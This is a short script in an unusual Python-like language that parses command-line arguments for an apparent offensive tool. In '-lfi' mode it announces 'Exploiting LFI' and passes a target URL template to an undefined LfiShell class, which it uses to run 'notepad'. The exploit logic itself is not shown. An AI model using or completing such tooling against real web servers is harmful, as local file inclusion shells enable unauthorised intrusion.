import('sys');

class CliArgs {
    Mode: null,
};

class ArgMode {
    Class: 0,
    Option: 1,
    OptionValue: 2,
};

class ArgOption {
    Lfi: '-lfi',
    Url: '-u',
};

parseArgs = @{
    args = sys.argv @skip(1);
    i = 0;
    key = null;
    mode = ArgMode.Class;
    obj = CliArgs();
    for (x in args) {
        if (mode == ArgMode.Class) {
            obj.Mode = x;
            mode = ArgMode.Option;
        } else if (mode == ArgMode.Option) {
            key = x;
            mode = ArgMode.OptionValue;
        } else if (mode == ArgMode.OptionValue) {
            mode = ArgMode.Option;
            
            if (key == ArgOption.Url) {
                obj.Url = x;
            }
        } else {
            print('Error parsing argument: %s' % x);
            quit();
        }
        
        i++;
    }
    
    ret obj;    
};

args = parseArgs();

if (args.Mode == ArgOption.Lfi) {
    print('Exploiting LFI');
    next_url = @(seq) args.Url % seq;    
    shell = LfiShell(args.Url % '', next_url);    
    shell.run('notepad');

    
} else {
    print('Invalid mode: %s' % args.Mode);
    quit();
}